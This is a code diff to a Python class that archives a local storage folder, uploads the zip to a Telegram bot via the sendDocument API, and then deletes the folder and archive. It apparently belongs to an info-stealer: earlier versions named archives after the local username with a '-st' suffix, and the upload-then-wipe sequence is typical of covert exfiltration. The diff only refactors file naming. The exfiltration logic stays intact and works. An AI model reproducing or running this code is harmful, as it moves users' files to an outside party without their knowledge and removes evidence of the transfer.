@@ -3,14 +3,12 @@ import requests
 from os import remove
 from shutil import make_archive, rmtree
 
-from getpass import getuser
-
 
 class Sender:
 
-    def __init__(self, storage_path: str, storage_folder: str, token: str, user_id: int):
+    def __init__(self, zip_name: str, storage_path: str, storage_folder: str, token: str, user_id: int):
 
-        self.user = getuser()
+        self.zip_name = zip_name
         self.storage_path = storage_path
         self.storage_folder = storage_folder
 
@@ -19,11 +17,11 @@ class Sender:
 
     def __create_archive(self):
 
-        make_archive(self.storage_path + f"{self.user}-st", 'zip', self.storage_path + "files/")
+        make_archive(f"{self.storage_path}{self.zip_name}", 'zip', f"{self.storage_path}{self.storage_folder}")
 
     def __send_archive(self):
 
-        with open(self.storage_path + f"{self.user}-st.zip", 'rb') as file:
+        with open(f"{self.storage_path}{self.zip_name}.zip", 'rb') as file:
 
             requests.post(
                 url=f"https://api.telegram.org/bot{self.token}/sendDocument",
@@ -39,8 +37,8 @@ class Sender:
 
     def __delete_files(self):
 
-        rmtree(self.storage_path + "files/")
-        remove(self.storage_path + f"{self.user}-st.zip")
+        rmtree(f"{self.storage_path}{self.storage_folder}")
+        remove(f"{self.storage_path}{self.zip_name}.zip")
 
     def run(self):
 
